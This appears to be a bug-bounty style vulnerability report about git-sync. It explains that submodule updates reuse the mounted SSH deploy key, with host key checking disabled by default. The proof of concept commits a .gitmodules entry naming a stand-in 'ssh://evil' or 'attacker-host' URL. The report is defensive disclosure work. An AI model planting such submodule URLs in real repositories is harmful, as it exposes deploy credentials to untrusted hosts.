### Title
Submodule URLs offer the mounted SSH identity to attacker-controlled hosts during `submodule update --init` - (File: main.go)

### Summary
`repoSync.configureWorktree()` runs `git submodule update --init [--recursive] [--depth N]` using the same process environment that `SetupGitSSH()` configured for the main repo fetch, including `GIT_SSH_COMMAND` (and default `StrictHostKeyChecking=no` when no known-hosts file is supplied). Because `GIT_SSH_COMMAND` is a git-wide environment variable rather than a per-remote/per-host setting, any submodule whose URL an attacker controls (via `.gitmodules`, which is ordinary repo content) causes git to reuse the exact same SSH command — and therefore the same mounted private key — against whatever host that URL names.

### Finding Description
`SetupGitSSH()` builds `GIT_SSH_COMMAND` once per run and exports it into the environment used for all git invocations for that sync cycle, pointing ssh at the mounted identity file and (by default) `StrictHostKeyChecking=no` unless an explicit known_hosts file is configured. `configureWorktree()` then calls `git submodule update --init ...` under that same environment. Git's submodule machinery resolves each submodule's fetch URL from `.gitmodules`, which is tracked repository content that an unprivileged contributor who can push commits/branches/tags to the synced repo fully controls. Nothing in `configureWorktree()` restricts which host names a submodule URL may target, nor does it scope `GIT_SSH_COMMAND` to only the operator-configured remote host — ssh has no concept of "this identity is only for host X" unless enforced via `~/.ssh/config` `Host` blocks or `IdentitiesOnly`/`ProxyCommand` restrictions, none of which `SetupGitSSH()` appears to construct. Consequently, an attacker who can commit a `.gitmodules` entry pointing at `ssh://attacker-host/...` causes the git-sync container to open an SSH connection to `attacker-host` using the mounted deploy key, with host key verification disabled by default.

### Impact Explanation
This breaks the intended invariant that the mounted SSH credential is presented only to the configured, operator-trusted remote. An attacker-controlled SSH server receiving this handshake can capture the public key fingerprint/offer and, more importantly, since `StrictHostKeyChecking=no` is the default, git-sync will proceed to authenticate against that host — disclosing key usage/authentication attempts to an adversary-controlled endpoint. This matches the Kubernetes bounty class of "secret/credential disclosure to unauthorized third party via cluster workload," since the private key material is used to authenticate to a host outside the operator's control.

### Likelihood Explanation
The precondition is minimal and matches the described threat model exactly: the attacker only needs push/ref-control over the synced repository (or its default branch/tag) — no flag, env, secret, or Pod-spec control is required. Adding or modifying `.gitmodules` to add a submodule pointing at `ssh://attacker-host/repo.git` is a normal, unprivileged git operation. `--recursive`/submodule support is a documented, supported git-sync feature, not a non-default hardening flag that mitigates this. The attack is fully repeatable on every sync cycle where `submodule update --init` runs.

### Recommendation
Scope SSH identity use to only the operator-configured host: construct a per-host `ssh -F <generated ssh_config>` (or `core.sshCommand` per-submodule via `.gitmodules`-independent config) that restricts `IdentityFile`/`IdentitiesOnly yes` to the known remote host(s), and either disable submodule support by default or require an explicit allow-list of submodule host names before permitting `submodule update` to run with the mounted key. Alternatively, refuse to honor `GIT_SSH_COMMAND` for hosts not matching the configured `--repo` host, and require `StrictHostKeyChecking=yes` with an operator-supplied known_hosts file whenever SSH auth + submodules are combined.

### Proof of Concept
1. Stand up two local git/ssh test servers: `origin` (trusted) and `evil` (attacker-controlled), each with its own sshd instance and captured connection logs.
2. Configure git-sync with `--repo=ssh://origin/...`, an SSH key mounted at the expected path, `--submodules=recursive`.
3. In the `origin` repo, commit a `.gitmodules` entry: `url = ssh://evil/sub.git`.
4. Run a sync cycle and assert, via the `evil` sshd's auth log, that an SSH connection using the mounted identity was received — i.e., the key was offered to `evil`, not just `origin`.
5. Expected (secure) behavior: git-sync should either refuse the submodule URL or scope the identity such that `evil` never receives an authentication attempt using the mounted key; observing a connection/auth attempt at `evil` confirms the vulnerability.
